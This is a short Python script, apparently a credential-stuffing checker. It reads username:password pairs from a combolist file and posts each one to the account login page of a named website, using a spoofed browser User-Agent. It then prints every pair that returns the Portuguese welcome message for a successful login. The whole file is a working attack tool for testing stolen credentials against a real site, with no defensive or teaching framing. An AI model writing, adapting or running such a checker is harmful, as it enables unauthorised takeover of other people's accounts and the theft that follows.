import requests

combolist = open("./projetos/combo.txt", "r").readlines()

url = "https://otpiece.com/account"

for combo in combolist:
    seq = combo.strip()
    acc = seq.split(":")
 
    headers={
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.106 (Edition std-1)",
        "loggin_account": acc[0],
        "loggin_password": acc[1],
    }
    
    req = requests.post(url, data=headers).text
    if "Bem vindo a sua conta!" in req:
        print(acc[0] +  ":" + acc[1])
